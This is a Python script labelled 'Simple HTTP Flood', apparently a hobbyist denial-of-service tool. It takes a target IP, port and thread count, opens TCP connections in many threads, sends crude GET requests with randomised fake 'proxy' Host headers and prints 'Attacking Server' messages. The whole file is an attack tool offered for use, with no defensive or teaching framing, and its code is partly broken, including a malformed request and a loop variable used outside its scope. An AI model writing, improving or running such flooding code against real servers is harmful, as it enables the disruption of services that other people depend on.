import socket, random, sys, threading, os

if os.name == 'posix':
  os.system('clear')
elif os.name == 'nt':
  os.system('cls')

logo = """\033[1;35m
                                                     
                                                     
                                                     
                                                     
                                                     
                       .iJU2s7.                      
    dQZSuYvi.       iQBBbLri7jPgg7                   
    2BBBBM77ri:.  iBQv   .ivvvrr7bQL                 
      SBBS       EBL  JBBQBQBBBQQX5BQ                
        7BBS    dB  sBBBgMDMDgDMgQQgQB               
          iBBQ::B. DBRMDDZDZDEDZgDgDQBs              
             vRBQ.JBQRDgZgEgZDZgZDZggBB              
                 2BBBQQggZgDgZgZDZDZgQB              
               S7   .XBBQBRMggZgZDZggBQ              
               iB:Kv    rPBBBBQgMDgZQBv  .i          
                PBuBBBI.    rZBBBBQQBP    .SP        
                 XBBBBBBBQu.    iqBQB.      rBE.     
                  :QBBBBQBBBBBXr.  .rDBBBQqUXBBBR.   
                    .UBQBBBBBBBBBi      :YdQBBBBBB   
                        .::i:.                       
                        
                  Simple HTTP Flood
                     By : MrSanZz
"""

try:
    print(logo)
    print('\n')
    ip = str(sys.argv[1])
    port = int(sys.argv[2])
    thd = int(sys.argv[3])
    def floods():
        ang = ['1','2','3','4','5','6','7','8','9','0']
        n1 = random.choice(ang)
        n2 = random.choice(ang)
        n3 = random.choice(ang)
        n4 = random.choice(ang)
        n5 = random.choice(ang)
        n6 = random.choice(ang)
        n7 = random.choice(ang)
        n8 = random.choice(ang)
        n9 = random.choice(ang)
        n10 = random.choice(ang)
        n11 = random.choice(ang)
        fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}:{n8}{n9}{n10}{n11}"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.sendto(("GET / " + ip + " HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
            s.sendto(("Host: " + fip + "\r\n\r\n").encode('ascii'), (ip,port))
            s.close()
            print(f"Attacking Server | {ip}:{port} Sent : ", i, f" With Proxy : {fip}", end='\r')
        except TimeoutError:
            print("Timeout  ", end='\r')
    for i in range(thd):
        t = threading.Thread(target=floods)
        t.start()
except IndexError:
    print('\n')
    print('[!] Usage : python3 flood.py <ip> <port> <thread count> [!]')
except TimeoutError:
    print("TIMEOUT ", end='\r')
